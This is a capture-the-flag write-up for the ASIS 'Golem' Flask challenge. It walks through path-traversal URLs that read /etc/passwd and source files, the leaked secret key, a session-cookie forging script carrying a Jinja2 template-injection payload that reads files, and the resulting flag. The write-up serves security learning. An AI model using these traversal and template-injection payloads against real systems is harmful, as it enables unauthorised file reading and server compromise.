

## GOLEM

LFI:

https://golem.asisctf.com/article?name=../../../etc/passwd


https://golem.asisctf.com/article?name=../../../opt/serverPython/golem/flag.py
WSGI:

https://golem.asisctf.com/article?name=../../../proc/self/cmdline 

Article Content: /usr/bin/uwsgi--ini/usr/share/uwsgi/conf/default.ini--ini/etc/uwsgi/apps-enabled/golem_proj.ini--daemonize/var/log/uwsgi/app/golem_proj.log


Project init:

https://golem.asisctf.com/article?name=../../../etc/uwsgi/apps-enabled/golem_proj.ini

Article Content: [uwsgi] socket	= 127.0.0.1:9090 plugin	= python wsgi-file	= /opt/serverPython/golem/server.py chdir = /opt/serverPython/golem process	= 3 callable	= app

Server.py:

https://golem.asisctf.com/article?name=../../../opt/serverPython/golem/server.py

(formatted):

```Python
import os

from flask import (
    Flask,
    render_template,
    request,
    url_for,
    redirect,
    session,
    render_template_string
)
from flask.ext.session import Session

app = Flask(__name__)


execfile('flag.py')
execfile('key.py')

FLAG = flag
app.secret_key = key


@app.route("/golem", methods=["GET", "POST"])
def golem():
    if request.method != "POST":
        return redirect(url_for("index"))

    golem = request.form.get("golem") or None

    if golem is not None:
        golem = golem.replace(".", "").replace(
            "_", "").replace("{", "").replace("}", "")

    if "golem" not in session or session['golem'] is None:
        session['golem'] = golem

    template = None

    if session['golem'] is not None:
        template = '''{% % extends "layout.html" % %}
		{% % block body % %}
		<h1 > Golem Name < /h1 >
		<div class ="row >
		<div class = "col-md-6 col-md-offset-3 center" >
		Hello: % s, why you don't look at our <a href=' / article?name = article'> article < /a >?
		< / div >
		< / div >
		{% % endblock % %}
		''' % session['golem']

        print

        session['golem'] = None

    return render_template_string(template)


@app.route("/", methods=["GET"])
def index():
    return render_template("main.html")


@app.route('/article', methods=['GET'])
def article():

    error = 0

    if 'name' in request.args:
        page = request.args.get('name')
    else:
        page = 'article'

    if page.find('flag') >= 0:
        page = 'notallowed.txt'

    try:
        template = open('/home/golem/articles/{}'.format(page)).read()
    except Exception as e:
        template = e

    return render_template('article.html', template=template)

if __name__ == "__main__":
    app.run(host='0.0.0.0', debug=False)

```


Critical part:

```

    if golem is not None:
        golem = golem.replace(".", "").replace(
            "_", "").replace("{", "").replace("}", "")

    if "golem" not in session or session['golem'] is None:
        session['golem'] = golem

```

golem in session checking AFTER golem from GET sanitized



flag.py:

https://golem.asisctf.com/article?name=../../../opt/serverPython/golem/flag.py

Article Content: Security Failed!!!


key.py:

https://golem.asisctf.com/article?name=../../../opt/serverPython/golem/key.py

Article Content: key = '7h15_5h0uld_b3_r34lly_53cur3d'


How to exploit SSTI in Flask (MUST READ!!!):

https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2/
https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/



Sample server with final payload to generate session cookies (build with http://flask.pocoo.org/docs/0.12/quickstart/):

```python
from flask import (
    Flask,
    session)
from flask.ext.session import Session


app = Flask(__name__)
app.secret_key = "7h15_5h0uld_b3_r34lly_53cur3d"

@app.route('/')
def hello_world():
    session["golem"] = "{{''.__class__.__mro__[2].__subclasses__()[40]('flag.py').read()}}" 

    print session
    return session["golem"]

```

Generated session cookie:

```
eyJnb2xlbSI6eyIgYiI6ImUzc25KeTVmWDJOc1lYTnpYMTh1WDE5dGNtOWZYMXN5WFM1ZlgzTjFZbU5zWVhOelpYTmZYeWdwV3pRd1hTZ25abXhoWnk1d2VTY3BMbkpsWVdRb0tYMTkifX0.DJX3ag.zCBdRTSBIlK8eYIsDELS2_KQjkI
```

And final request:

```
Hello : flag = 'ASIS{I_l0v3_SerV3r_S1d3_T3mplate_1nj3ct1on!!}' , why you don't look at our article?
```

